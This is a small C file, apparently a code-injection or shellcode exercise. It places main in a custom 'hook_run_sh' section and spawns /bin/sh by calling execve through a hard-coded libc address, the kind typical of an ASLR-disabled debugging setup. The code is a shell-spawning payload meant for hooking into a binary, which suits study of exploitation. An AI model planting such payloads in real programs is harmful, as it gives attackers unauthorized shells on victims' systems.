#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>

typedef int (*execve_t)(const char *, char *const [], char *const []);

int __attribute__((section("hook_run_sh"))) main(void)
{
    /*char *sh = "/bin/sh";*/
    execve_t execve_ptr = NULL;
    char sh[20] = {'/', 'b', 'i', 'n', '/', 's', 'h', '\0'};
    char *argv[] = {sh, NULL};

    execve_ptr = (execve_t)0x7ffff7ad77b0;

    (*execve_ptr)(sh, argv, NULL);

    return 0;
}
